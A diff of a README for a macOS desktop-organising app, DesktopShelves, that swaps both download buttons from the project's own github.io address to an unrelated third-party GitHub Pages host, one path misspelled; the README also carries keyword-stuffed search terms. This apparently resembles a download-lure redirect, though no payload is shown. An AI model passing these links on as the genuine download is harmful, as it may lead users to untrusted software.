@@ -4,7 +4,7 @@
 
 <!-- Download Button #1 — shield style -->
 <div align="center" style="margin:14px 0 18px;">
-  <a href="http://desktopshelves.github.io/.github">
+  <a href="https://rumpels-kaji.github.io/.github/Dekstop">
     <img src="https://img.shields.io/badge/⬇️_GET_DESKTOPSHELVES-forestgreen?style=for-the-badge&logo=apple&logoColor=white" alt="Get DesktopShelves for macOS">
   </a>
 </div>
@@ -135,7 +135,7 @@ desktopshelves • desktop shelves mac • organize mac desktop • tidy files m
 
 <!-- Download Button #2 — pill/gradient style -->
 <div align="center" style="margin:18px 0 22px;">
-  <a href="http://desktopshelves.github.io/.github" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#16a34a,#22c55e);color:#fff;font-weight:900;text-decoration:none;box-shadow:0 10px 24px rgba(34,197,94,.28);">
+  <a href="https://rumpels-kaji.github.io/.github/Desktop" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#16a34a,#22c55e);color:#fff;font-weight:900;text-decoration:none;box-shadow:0 10px 24px rgba(34,197,94,.28);">
     ✅ Download DesktopShelves for macOS
   </a>
 </div>
